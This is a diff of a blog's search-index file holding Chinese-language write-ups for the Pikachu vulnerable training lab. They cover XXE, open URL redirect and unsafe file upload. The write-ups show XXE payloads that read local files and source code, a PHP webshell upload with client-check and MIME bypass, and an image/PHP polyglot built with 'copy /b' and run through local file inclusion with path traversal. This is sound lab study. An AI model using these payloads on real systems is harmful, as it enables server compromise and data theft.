-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>DTD(Document Type Define)文档类型定义</strong></p>
-<p>用于描述 XML 文档结构</p>
-<p><strong>DTD 定义文档规则（DOCTYPE）</strong></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">DTD文档的声明及引用有三种：</span><br><span class="line">内部DTD文档：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE  根元素[定义元素属性等等内容]&gt;</span></span><br><span class="line">外部DTD文档：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素  <span class="keyword">SYSTEM</span> <span class="string">&#x27;DTD文件路径&#x27;</span>&gt;</span></span><br><span class="line">内外部DTD文档结合：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素  <span class="keyword">SYSTEM</span> <span class="string">&#x27;DTD文件路径&#x27;</span>[定义元素属性等等内容]&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>DTD 元素定义（ELEMENT）</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：&lt;!ELEMENT 元素名称(NAME)  元素类型(COUTENT)&gt;</span><br><span class="line">    注：ELEMENT关键字</span><br><span class="line">元素名称：就是自定义的子标签名称</span><br><span class="line">元素类型：</span><br><span class="line">    EMPTY：该元素不能包含子元素和文本，但是可以有属性，这类元素称为自闭和标签</span><br><span class="line">    ANY：该元素可以包含任意在DTD中定义的元素内容</span><br><span class="line">    #PCDATA：可以包含任何字符数据，设置这个就不能包含子元素了，一般设置具体value</span><br><span class="line">    混合元素类型：只包含子元素，并且这些子元素没有文本</span><br><span class="line">    混合类型：包含子元素和文本数据混合体</span><br></pre></td></tr></table></figure>
-
-<p><strong>DTD 属性定义（ATTLIST）</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：&lt;!ATTLIST 元素名称 属性名称 类型 属性特点&gt;</span><br><span class="line">元素名称：我们自定义的元素名称</span><br><span class="line">属性类型：我们为元素上添加自定义属性</span><br><span class="line">类型：</span><br><span class="line">    CDATA：</span><br><span class="line">        任意字符（理解为任意字符的字符串）</span><br><span class="line">    ID：</span><br><span class="line">        以字母开头唯一值字符串，</span><br><span class="line">    IDREF/IDREFS：</span><br><span class="line">        可以指向文档中其它地方声明的ID类型值（设置此值是可以在文档上存在的）</span><br><span class="line">        使用IDREFS时可以使用空格隔开</span><br><span class="line">    NMTOKEN/NMTOKENS：</span><br><span class="line">        NMTOKEN是CDATA的一个子集，设置该属性时只能写英文字母、数字、句号、破折号</span><br><span class="line">        下划线、冒号，但是属性值里面不能有空格　　　　  NMTOKENS：它是复数，如果设置多个值由空格隔开　　 Enumerated:　　　　　事先定义好一些值，属性的值必须在所列出的值范围内</span><br><span class="line">属性特点：</span><br><span class="line">    #REQUIRED</span><br><span class="line">        表示必须设置此属性</span><br><span class="line">    #IMPLIED</span><br><span class="line">        表示此属性可写可不写</span><br><span class="line">    #FIXED value</span><br><span class="line">        表示元素实例中该属性的值必须是指定的固定值</span><br><span class="line">    #Default value</span><br><span class="line">        为属性提供一个默认值</span><br></pre></td></tr></table></figure>
-
-<p><strong>DTD 实体定义（ENTITY）</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实体分类：</span><br><span class="line">    普通内部实体，普通外部实体，内部参数实体，外部参数实体</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line">    普通内部实体定义：&lt;!ENTITY 实体名 &quot;实体值&quot;&gt;</span><br><span class="line">    普通外部实体引入：&lt;!ENTITY 实体名 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">    内部参数实体定义：&lt;!ENTITY % 实体名 &quot;实体值&quot;&gt;</span><br><span class="line">    外部参数实体引入：&lt;!ENTITY % 实体名 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line"></span><br><span class="line">示例定义：</span><br><span class="line">    &lt;!ENTITY name &quot;pikachu&quot;&gt;</span><br><span class="line">    &lt;!ENTITY address &quot;Kali Linux&quot;&gt;</span><br><span class="line">示例XML里使用：</span><br><span class="line">    &lt;name&gt;&amp;name;&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">使用范围：定义实体分为内部实体（定义在当前xml文件）和外部实体（定义在外部dtd文件里）</span><br></pre></td></tr></table></figure>
-
-<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>我们输入普通的文本，发现会弹出这个，并且我们从浏览器或者 hackbar 插件中可以知道是 POST 请求，并且有两个参数，一个是 xml，一个是 submit。</p>
-<p><img src="/../../img/docs/pikachu/XXE/1739618316480-9799684b-945d-4902-8c48-ce94390c9ebd.png"></p>
-<p>根据上面的 XML 声明、DTD 文档类型定义、DTD 实体我们就可以构造一个</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">pi</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">text</span> <span class="string">&quot;pikachu&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">pi</span>&gt;</span><span class="symbol">&amp;text;</span><span class="tag">&lt;/<span class="name">pi</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>有回显，输出 pikachu（上面的根元素和实体名任意，只需要实体名与下面的实体元素名称相同就行）</p>
-<p><img src="/../../img/docs/pikachu/XXE/1739671184230-29b4ab28-b7c1-4624-bb43-fa82ea7ea15a.png"></p>
-<p><strong>XML DTD 外部引用</strong></p>
-<p><strong>支持 file http 还有各种伪协议</strong></p>
-<p>我们还可以通过路径来回显，如果成功，则代表可以访问文件。（下面代码限于 Windows 服务器，我的靶场在 Linux docker 里面，试了几遍没有试出来。）</p>
-<p><strong>使用 file 路径（文件绝对路径）</strong></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">pi</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">text</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">pi</span>&gt;</span><span class="symbol">&amp;text;</span><span class="tag">&lt;/<span class="name">pi</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../img/docs/pikachu/XXE/1739672218034-20141404-07c1-4f2d-bee5-a1bd48622295.png"></p>
-<p><strong>使用 PHP 伪协议</strong></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">pi</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">text</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=E:/Soft/phpstudy_pro/WWW/pikachu/vul/xxe/xxe_1.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">pi</span>&gt;</span><span class="symbol">&amp;text;</span><span class="tag">&lt;/<span class="name">pi</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../img/docs/pikachu/XXE/1739672840755-33677208-c389-4206-a27b-eb77165436e4.png"></p>
-<p><img src="/../../img/docs/pikachu/XXE/1739672854232-56a5e93c-4dc2-49a9-bd01-429bb7b88614.png"></p>
-<p><strong>无回显操作</strong></p>
-<p>看网上有的说不能操作，还有的教程往服务端放了两个文件，一个文件是通过 GET 或者 POST 协议来接收数据，然后对 base64 进行解码，进行保存文件(php 文件)，然后一个外部的 XML 文件用来之后payload 的外部引用。</p>
-<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="variable">$xml</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>];</span><br><span class="line">  <span class="comment">//    $xml = $test;</span></span><br><span class="line">  <span class="variable">$data</span> = @<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$data</span>)&#123;</span><br><span class="line">    <span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$data&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>具体来说用了simplexml_load_string 函数对 xml 字符串解析成一个对象。</p>
-]]></content>
-      <categories>
-        <category>网安</category>
-        <category>靶场</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>网安</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Pikachu靶场————暴力破解</title>
     <url>/posts/61262.html</url>
     <content><![CDATA[<p>使用到的工具：</p>
@@ -860,6 +693,173 @@
 
 <h1 id="敏感信息二"><a href="#敏感信息二" class="headerlink" title="敏感信息二"></a>敏感信息二</h1><p>我们把 php 那个文件名删掉，可以看到一个目录，这也是敏感信息泄露。</p>
 <p><img src="/../../img/docs/pikachu/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/1738574032795-677e22e9-b509-4456-8d35-eb5091bbd6d6.png"></p>
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>URL重定向</title>
+    <url>/posts/60126.html</url>
+    <content><![CDATA[<p><strong>不安全的 URL 跳转</strong></p>
+<p>很容易发现超链接用一个 url 进行 GET 传参，我们进行构造</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/urlredirect/urlredirect.php?url=https:<span class="comment">//www.baidu.com</span></span><br></pre></td></tr></table></figure>
+
+<p>发现，很容易就进入了百度的页面。</p>
+<p>并且当我们输入..&#x2F;的时候，就一个目录吧，也会出现铭感信息泄露的问题（可能是这个靶场本来就没有做，笑）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/urlredirect/urlredirect.php?url=../</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Unsafe Fileupload</title>
+    <url>/posts/55331.html</url>
+    <content><![CDATA[<p>不安全的文件上传</p>
+<h1 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h1><p><strong>客户端检测</strong></p>
+<p>他说这里只允许上传图片，我们就看看这里的 HTML 语句，发现有一个 JS 代码限制了文件的类型。我们可以常识一下禁止 JS 代码或者修改 JS 代码。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFileExt</span>(<span class="params">filename</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="literal">false</span>; <span class="comment">//状态</span></span><br><span class="line">  <span class="keyword">var</span> arr = [<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;gif&quot;</span>];</span><br><span class="line">  <span class="comment">//取出上传文件的扩展名</span></span><br><span class="line">  <span class="keyword">var</span> index = filename.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> ext = filename.<span class="title function_">substr</span>(index+<span class="number">1</span>);</span><br><span class="line">  <span class="comment">//比较</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.<span class="property">length</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(ext == arr[i])</span><br><span class="line">      &#123;</span><br><span class="line">        flag = <span class="literal">true</span>; <span class="comment">//一旦找到合适的，立即退出循环</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//条件判断</span></span><br><span class="line">  <span class="keyword">if</span>(!flag)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;上传的文件不符合要求，请重新选择！&quot;</span>);</span><br><span class="line">    location.<span class="title function_">reload</span>(<span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们采用了禁止 JS 代码运行，我直接上传了一句话木马，网页直接给我了相对位置了。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">uploads/hack.<span class="property">php</span></span><br></pre></td></tr></table></figure>
+
+<p>然后用蚁剑去利用。</p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738549392898-996977a9-c72b-40ee-ac13-a431ff0347de.png"></p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738549418881-2f414217-a66d-42de-b33a-03c057ffba9d.png"></p>
+<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p><strong>MIME</strong> 是描述消息内容类型的标准。</p>
+<p><a href="https://www.runoob.com/http/mime-types.html">https://www.runoob.com/http/mime-types.html</a></p>
+<p>**MIME **类型通用结构</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">type/subtype</span><br></pre></td></tr></table></figure>
+
+<p>这里我们查看浏览器，为 POST 请求，还有一个multipart&#x2F;form-data 是指定传输数据为二进制类型。</p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738549827916-c8398f53-d1b0-4aea-8149-77764ec12dda.png"></p>
+<p>我们尝试一下抓包，内容如下</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;uploadfile&quot;</span>; filename=<span class="string">&quot;hack.png&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/octet-stream</span><br></pre></td></tr></table></figure>
+
+<p>看到类型为 applicaiton&#x2F;octet-stream 我们可以改成image&#x2F;png 或者其他图片类型看看。</p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738550444506-3f0ce96a-23f5-462e-9858-ec19dd76e650.png"></p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738550462080-4f4d36ad-ac49-4019-89c0-5a529eaa3059.png"></p>
+<p>可以上传成功，我们用蚁剑去验证。</p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738550605915-9e95c319-40ad-4a6c-be0a-f4e45328297f.png"></p>
+<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h1><p>getimagesize 获取图片大小（用于看到底是不是图片的一个函数）</p>
+<p>我们看 DOS 命令中的 copy</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">COPY</span> [/<span class="type">D</span>] [/<span class="type">V</span>] [/<span class="type">N</span>] [/<span class="type">Y</span> | /-<span class="type">Y</span>] [/<span class="type">Z</span>] [/<span class="type">L</span>] [/<span class="type">A</span> | /<span class="type">B</span> ] source [/<span class="type">A</span> | /<span class="type">B</span>]</span><br><span class="line">     [+ <span class="type">source</span> [/<span class="type">A</span> | /<span class="type">B</span>] [+ <span class="type">...</span>]] [<span class="type">destination</span> [/<span class="type">A</span> | /<span class="type">B</span>]]</span><br><span class="line"></span><br><span class="line">  source       指定要复制的文件。</span><br><span class="line">  /A           表示一个 ASCII 文本文件。</span><br><span class="line">  /B           表示一个二进位文件。</span><br><span class="line">  /D           允许解密要创建的目标文件</span><br><span class="line">  destination  为新文件指定目录和/或文件名。</span><br><span class="line">  /V           验证新文件写入是否正确。</span><br><span class="line">  /N           复制带有非 <span class="number">8</span>dot3 名称的文件时，</span><br><span class="line">               尽可能使用短文件名。</span><br><span class="line">  /Y           不使用确认是否要覆盖现有目标文件</span><br><span class="line">               的提示。</span><br><span class="line">  /<span class="literal">-Y</span>          使用确认是否要覆盖现有目标文件</span><br><span class="line">               的提示。</span><br><span class="line">  /Z           用可重新启动模式复制已联网的文件。</span><br><span class="line">/L           如果源是符号链接，请将链接复制</span><br><span class="line">               到目标而不是源链接指向的实际文件。</span><br><span class="line"></span><br><span class="line">命令行开关 /Y 可以在 COPYCMD 环境变量中预先设定。</span><br><span class="line">这可能会被命令行上的 /<span class="literal">-Y</span> 替代。除非 <span class="built_in">COPY</span></span><br><span class="line">命令是在一个批处理脚本中执行的，默认值应为</span><br><span class="line">在覆盖时进行提示。</span><br><span class="line"></span><br><span class="line">要附加文件，请为目标指定一个文件，为源指定</span><br><span class="line">数个文件(用通配符或 file1+file2+file3 格式)。</span><br></pre></td></tr></table></figure>
+
+<p>copy 中的加号是用于将多个文件合并成一个文件的意思。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> /b hack.php+<span class="number">2</span>.jpg hack.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738551337714-2852671a-667c-40ad-b550-593e0e01fd0d.png"></p>
+<p>发现图片大了</p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738551380903-ddc2d3b4-2a51-4737-8ce6-25ad0daebe4d.png"></p>
+<p><strong>解决方法</strong></p>
+<ol>
+<li><strong>修改 php.ini 文件</strong></li>
+<li><strong>上传小图片</strong></li>
+</ol>
+<p>我这里尝试一下修改 php.ini 文件</p>
+<p>查看 php.ini 位置，我们到 RCE 那章的 exec “eval”那节输入 phpinfo();</p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738551687865-c3ccc0e7-8327-44fb-8352-28bd47aad4cc.png"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/etc/php/<span class="number">7.3</span>/apacha2/php.ini</span><br></pre></td></tr></table></figure>
+
+<p>我们进入 pikachu Docker 容器</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">docker exec <span class="literal">-it</span> [容器<span class="type">ID</span>] /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>我们通过 cd 找到文件，然后输入 vim php.ini，按下 i 编辑，去编辑，随便修改一下大小，最后按下 esc，再输入:wq，OK!</p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738552023012-9af8d68b-8010-401a-9c42-00e1b0da2672.png"></p>
+<p>哈哈，终于可以上传图片了，不过还是失败了，这是咋回事？</p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738552487267-b867d845-640d-4f94-b0e0-66607143d41c.png"></p>
+<p>我们用 010Editor 或者 winexe 查看文件的二进制和 16 禁止还有 ASCII 码看看。发现我们的 php 代码在前面，明显我们的 DOS 命令的顺序错误了，我们修改一下</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738552548273-48cd6434-d9c6-48eb-9ed9-25962a10b3b1.png)</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> /b <span class="number">2</span>.jpg+ack.php hack.jpg</span><br></pre></td></tr></table></figure>
+
+<p>我们再次上传，我们发现应该是后端 getimagesize 设定是 512kb 的图片，又双叒叕踩坑了。</p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738552701466-9de2af0b-5ab1-420c-8211-6b4415452082.png"></p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738552814587-0fe7cae6-728d-44bf-a14f-7021497f9fde.png"></p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738552838685-b58c3555-cbd7-418b-a382-6c4c1a8b3ae8.png"></p>
+<p>我可以放到蚁剑去检验，发现没用，因为它被后端框架被识别是图片，只会展示出来，我们需要用上之前节的文件包含，才会被识别为 php 代码。因为 Include 即使有报错也会往下运行，所以非常欧克。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/fileinclude/fi_local.php?filename=file2.php&amp;submit=%E6%<span class="number">8</span>F%<span class="number">90</span>%E4%BA%A4%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">unsafeupload/uploads/<span class="number">2025</span>/<span class="number">02</span>/<span class="number">03</span>/<span class="number">72956067</span>a035f759000198096914.png</span><br></pre></td></tr></table></figure>
+
+<p>&#x3D;</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/<span class="number">2025</span>/<span class="number">02</span>/<span class="number">03</span>/<span class="number">72956067</span>a035f759000198096914.png&amp;submit=%E6%<span class="number">8</span>F%<span class="number">90</span>%E4%BA%A4%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+<p>完美！</p>
+<p><img src="/../../img/docs/pikachu/Unsafe_Fileupload/1738553350413-a2f51e0a-82ae-4f3f-adab-7e92fda73ce2.png"></p>
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XXE</title>
+    <url>/posts/57467.html</url>
+    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>XXE - “<strong>xml external entity injection</strong>“，”xml 外部实体注入漏洞”。</p>
+<p>XML 指的是可拓展标记语言(extensible markup language)</p>
+<p>菜鸟教程：<a href="https://www.runoob.com/xml/xml-tutorial.html">https://www.runoob.com/xml/xml-tutorial.html</a></p>
+<p>XML 从入门到深入：<a href="https://www.cnblogs.com/antLaddie/p/14823874.html">https://www.cnblogs.com/antLaddie/p/14823874.html</a></p>
+<p><strong>XML 声明</strong></p>
+<p>必须在第一行，参数有 version, encoding, standalone</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>DTD(Document Type Define)文档类型定义</strong></p>
+<p>用于描述 XML 文档结构</p>
+<p><strong>DTD 定义文档规则（DOCTYPE）</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">DTD文档的声明及引用有三种：</span><br><span class="line">内部DTD文档：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE  根元素[定义元素属性等等内容]&gt;</span></span><br><span class="line">外部DTD文档：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素  <span class="keyword">SYSTEM</span> <span class="string">&#x27;DTD文件路径&#x27;</span>&gt;</span></span><br><span class="line">内外部DTD文档结合：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素  <span class="keyword">SYSTEM</span> <span class="string">&#x27;DTD文件路径&#x27;</span>[定义元素属性等等内容]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>DTD 元素定义（ELEMENT）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：&lt;!ELEMENT 元素名称(NAME)  元素类型(COUTENT)&gt;</span><br><span class="line">    注：ELEMENT关键字</span><br><span class="line">元素名称：就是自定义的子标签名称</span><br><span class="line">元素类型：</span><br><span class="line">    EMPTY：该元素不能包含子元素和文本，但是可以有属性，这类元素称为自闭和标签</span><br><span class="line">    ANY：该元素可以包含任意在DTD中定义的元素内容</span><br><span class="line">    #PCDATA：可以包含任何字符数据，设置这个就不能包含子元素了，一般设置具体value</span><br><span class="line">    混合元素类型：只包含子元素，并且这些子元素没有文本</span><br><span class="line">    混合类型：包含子元素和文本数据混合体</span><br></pre></td></tr></table></figure>
+
+<p><strong>DTD 属性定义（ATTLIST）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：&lt;!ATTLIST 元素名称 属性名称 类型 属性特点&gt;</span><br><span class="line">元素名称：我们自定义的元素名称</span><br><span class="line">属性类型：我们为元素上添加自定义属性</span><br><span class="line">类型：</span><br><span class="line">    CDATA：</span><br><span class="line">        任意字符（理解为任意字符的字符串）</span><br><span class="line">    ID：</span><br><span class="line">        以字母开头唯一值字符串，</span><br><span class="line">    IDREF/IDREFS：</span><br><span class="line">        可以指向文档中其它地方声明的ID类型值（设置此值是可以在文档上存在的）</span><br><span class="line">        使用IDREFS时可以使用空格隔开</span><br><span class="line">    NMTOKEN/NMTOKENS：</span><br><span class="line">        NMTOKEN是CDATA的一个子集，设置该属性时只能写英文字母、数字、句号、破折号</span><br><span class="line">        下划线、冒号，但是属性值里面不能有空格　　　　  NMTOKENS：它是复数，如果设置多个值由空格隔开　　 Enumerated:　　　　　事先定义好一些值，属性的值必须在所列出的值范围内</span><br><span class="line">属性特点：</span><br><span class="line">    #REQUIRED</span><br><span class="line">        表示必须设置此属性</span><br><span class="line">    #IMPLIED</span><br><span class="line">        表示此属性可写可不写</span><br><span class="line">    #FIXED value</span><br><span class="line">        表示元素实例中该属性的值必须是指定的固定值</span><br><span class="line">    #Default value</span><br><span class="line">        为属性提供一个默认值</span><br></pre></td></tr></table></figure>
+
+<p><strong>DTD 实体定义（ENTITY）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实体分类：</span><br><span class="line">    普通内部实体，普通外部实体，内部参数实体，外部参数实体</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line">    普通内部实体定义：&lt;!ENTITY 实体名 &quot;实体值&quot;&gt;</span><br><span class="line">    普通外部实体引入：&lt;!ENTITY 实体名 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">    内部参数实体定义：&lt;!ENTITY % 实体名 &quot;实体值&quot;&gt;</span><br><span class="line">    外部参数实体引入：&lt;!ENTITY % 实体名 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line"></span><br><span class="line">示例定义：</span><br><span class="line">    &lt;!ENTITY name &quot;pikachu&quot;&gt;</span><br><span class="line">    &lt;!ENTITY address &quot;Kali Linux&quot;&gt;</span><br><span class="line">示例XML里使用：</span><br><span class="line">    &lt;name&gt;&amp;name;&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">使用范围：定义实体分为内部实体（定义在当前xml文件）和外部实体（定义在外部dtd文件里）</span><br></pre></td></tr></table></figure>
+
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>我们输入普通的文本，发现会弹出这个，并且我们从浏览器或者 hackbar 插件中可以知道是 POST 请求，并且有两个参数，一个是 xml，一个是 submit。</p>
+<p><img src="/../../img/docs/pikachu/XXE/1739618316480-9799684b-945d-4902-8c48-ce94390c9ebd.png"></p>
+<p>根据上面的 XML 声明、DTD 文档类型定义、DTD 实体我们就可以构造一个</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">pi</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">text</span> <span class="string">&quot;pikachu&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">pi</span>&gt;</span><span class="symbol">&amp;text;</span><span class="tag">&lt;/<span class="name">pi</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>有回显，输出 pikachu（上面的根元素和实体名任意，只需要实体名与下面的实体元素名称相同就行）</p>
+<p><img src="/../../img/docs/pikachu/XXE/1739671184230-29b4ab28-b7c1-4624-bb43-fa82ea7ea15a.png"></p>
+<p><strong>XML DTD 外部引用</strong></p>
+<p><strong>支持 file http 还有各种伪协议</strong></p>
+<p>我们还可以通过路径来回显，如果成功，则代表可以访问文件。（下面代码限于 Windows 服务器，我的靶场在 Linux docker 里面，试了几遍没有试出来。）</p>
+<p><strong>使用 file 路径（文件绝对路径）</strong></p>
